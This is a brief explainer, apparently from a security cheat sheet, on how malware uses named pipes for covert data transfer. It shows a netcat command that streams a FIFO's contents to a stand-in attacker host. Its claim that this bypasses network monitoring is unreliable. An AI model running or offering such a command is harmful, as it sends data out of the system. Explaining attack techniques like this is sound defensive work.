# Named Pipes for Covert Data Transfer

Malware often abuses named pipes (mkfifo) to stealthily transmit data between processes.

How It Works
Pipes allow inter-process communication, often between malware components.

Attackers use FIFO pipes to bypass traditional network monitoring.

Example: Stealth Data Exfiltration
```sh
mkfifo /tmp/hidden_pipe
nc attacker.com 4444 < /tmp/hidden_pipe
```
Impact: Data is streamed through a named pipe, bypassing detection mechanisms.
